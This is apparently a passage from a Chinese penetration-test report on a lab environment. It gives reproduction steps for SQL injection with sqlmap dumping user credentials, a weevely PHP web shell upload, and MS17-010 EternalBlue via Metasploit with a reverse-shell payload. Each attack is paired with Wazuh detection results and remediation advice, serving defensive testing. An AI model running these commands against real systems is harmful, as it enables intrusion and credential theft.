## 二、测试详情

### 2.1 V-001: SQL 注入漏洞

| 项目 | 内容 |
|------|------|
| 目标 | http://192.168.152.129:8080/vulnerabilities/sqli/ |
| 工具 | SQLMap v1.7.2 |
| 漏洞类型 | 基于 Union 的 SQL 注入 |
| 影响 | 数据库数据泄露（用户凭据） |

**复现步骤**:
```bash
sqlmap -u "http://192.168.152.129:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="security=low; PHPSESSID=xxx" --batch -D dvwa -T users --dump
```

**获取的数据**: 管理员密码哈希（MD5: `5f4dcc3b5aa765d61d8327deb882cf99` → `password`）

> 📸 **截图**: SQLMap 成功 dump 数据的终端输出

**Wazuh 检测效果**:
- 规则 `100010` 触发（Level 8）
- 检测到 SQLMap 时提升为规则 `100011`（Level 10）

**加固建议**:
| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 使用参数化查询 | 禁止拼接 SQL 语句 |
| P1 | WAF 部署 | 在 Web Server 前部署 ModSecurity |
| P2 | 最小权限数据库账户 | Web 应用不应使用 root 数据库账户 |

### 2.2 V-002: WebShell 上传漏洞

| 项目 | 内容 |
|------|------|
| 目标 | http://192.168.152.129:8080/vulnerabilities/upload/ |
| 工具 | weevely 3.7 |
| 漏洞类型 | 任意文件上传 |
| 影响 | 远程命令执行（www-data 权限） |

**复现步骤**:
```bash
weevely generate p@ssw0rd /tmp/shell.php
# 通过 DVWA 文件上传功能上传 shell.php
weevely http://192.168.152.129:8080/hackable/uploads/shell.php p@ssw0rd
```

**获取的权限**: `www-data`（Web 服务器用户）

> 📸 **截图**: weevely 连接成功后的交互界面

**Wazuh 检测效果**:
- 规则 `100030` 检测到 PHP 文件创建（Level 7）
- 规则 `100031` 检测到危险函数请求（Level 9）

**加固建议**:
| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 文件类型白名单限制 | 仅允许图片、文档类型上传 |
| P1 | 文件上传目录禁止执行 PHP | Apache 配置 `<Directory>` 禁用执行权限 |
| P2 | 上传文件重命名 | 使用 UUID 重命名，避免原始文件名 |

### 2.3 V-003: MS17-010 远程代码执行

| 项目 | 内容 |
|------|------|
| 目标 | 192.168.152.131 (Win7 靶机) |
| 工具 | Metasploit Framework 6.x |
| CVE 编号 | CVE-2017-0143 ~ CVE-2017-0148 |
| 影响 | 完全远程控制（SYSTEM 权限） |

**复现步骤**:
```bash
msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS 192.168.152.131
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.152.130
msf6 > set LPORT 4444
msf6 > exploit
```

**获取的权限**: `NT AUTHORITY\SYSTEM`（系统最高权限）

> 📸 **截图**: Metasploit 成功建立 Meterpreter 会话

**Wazuh 检测效果**:
- 规则 `100041` 检测到 `spoolsv.exe` 创建异常子进程（Level 12）
- 自动封禁脚本执行 iptables 阻断攻击 IP（MTTR < 2s）

**加固建议**:
| 优先级 | 措施 | 说明 |
|--------|------|------|
| P0 | 安装 MS17-010 安全补丁（KB4013389） | 官方修复方案 |
| P1 | 禁用 SMBv1 协议 | `Set-SmbServerConfiguration -EnableSMB1Protocol $false` |
| P2 | 防火墙限制 445 端口访问 | 仅允许内网信任 IP 访问 |

## 五、整改建议优先级

### 应在 1 周内完成（P0）
1. 所有 Windows 系统安装 MS17-010 安全补丁
2. Web 应用全面使用参数化查询替代 SQL 拼接
3. 部署 WAF（推荐 ModSecurity + OWASP CRS）

### 应在 1 个月内完成（P1）
4. 服务器禁用 SMBv1 协议
5. Web 上传目录禁止脚本执行
6. 配置 Windows 防火墙 SMB 端口白名单

### 建议在 3 个月内完成（P2）
7. 引入 Wazuh 自定义规则到生产环境
8. 部署自动封禁机制（参考本项目脚本）
9. 开展全员安全意识培训
